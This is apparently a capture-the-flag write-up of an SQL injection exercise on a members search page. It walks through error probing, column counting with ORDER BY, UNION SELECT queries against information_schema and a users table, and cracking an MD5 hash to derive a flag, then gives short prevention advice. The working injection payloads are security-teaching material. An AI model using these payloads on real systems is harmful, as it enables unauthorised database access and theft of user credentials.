# SQL Injection: Members

The members page of the website have an input field to search for members. Firstly we have to try if the input is vulnerable to SQL injection. Let's try a simple payload like `'` to see if we can get a SQL error message. There is the output:
```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1
```
This means that the input is vulnerable to SQL injection. NBut we have to find the number of columns in the table to be able to add a UNION SELECT statement. Let's try:
```SQL
1 ORDER BY 1 -- WORKING
2 ORDER BY 2 -- WORKING
3 ORDER BY 3 -- NOT WORKING
```
This means that the table has 2 columns. Now we can fake the first column with a number to simulate the id column and the second column with the result of an UNION SELECT. For example we can explore the database schema with the following query:
```SQL
1 UNION ALL SELECT table_name, GROUP_CONCAT(column_name) FROM information_schema.columns GROUP BY table_name
```
Now we can see the tables and columns of the database. We can see an `users` tables with the following columns:
```
town,last_name,first_name,user_id,country,planet,countersign,Commentaire
```
Let's check the `Commentaire` column values:
```SQL
1 UNION ALL SELECT Commentaire, countersign FROM users
```
This will return the `Commentaire` and `countersign` columns from the `users` table. But one of the values is :
```
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```
If we decrypt `5ff9d0165b4f92b14994e5c685cdce28` in MD5 we get `FortyTwo`. Then encrypt it with SHA256 and lower all the characters:
```bash
echo -n "fortytwo" | sha256sum | cut -d ' ' -f 1
```
We get the flag.

# How to prevent it
To prevent SQL injection, you should always use prepared statements or parameterized queries. This ensures that user input is treated as data and not executable code. Additionally, you should validate and sanitize user input to ensure it meets the expected format and does not contain malicious content. Just use an ORM...